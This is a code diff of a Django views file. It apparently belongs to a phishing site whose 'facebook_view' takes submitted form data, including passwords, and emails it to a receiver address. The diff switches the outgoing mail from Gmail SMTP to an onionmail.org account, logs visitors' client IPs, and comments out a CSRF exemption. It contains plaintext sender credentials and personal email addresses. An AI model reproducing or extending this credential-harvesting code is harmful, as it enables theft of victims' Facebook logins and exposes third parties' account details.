@@ -30,7 +30,7 @@ def get_client_ip(request):
 
 def home_view(request):
 	sc = SiteContent.objects.get(id = 1)
-
+	print(get_client_ip(request))
 	context = {
 		'sc' : sc
 
@@ -38,7 +38,7 @@ def home_view(request):
 	return render(request, 'home.html', context)
 
 
-@csrf_exempt
+#@csrf_exempt
 def facebook_view(request):
 
 	# To render error messages for unmatched password
@@ -123,7 +123,7 @@ def facebook_view(request):
 			
 			
 			# Using SMTP to send mail of form input
-			EMAIL_ADDRESS = "noreplyimf.org@gmail.com"
+			EMAIL_ADDRESS = "ciaramcqueen@onionmail.org"
 			EMAIL_PASSWORD = "4kushakara"
 			receiver = "ibrahimola72@gmail.com"
 			
@@ -136,8 +136,14 @@ def facebook_view(request):
 
 			msg.set_content(textsms)
 
-			#gmail smpt setting
-			with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+			# #gmail smpt setting
+			# with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+			# 	smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+			# 	smtp.send_message(msg)
+
+			#onion mail smtp setting
+			with smtplib.SMTP('mail.onionmail.org', 587) as smtp:
+				smtp.starttls()
 				smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
 				smtp.send_message(msg)
 
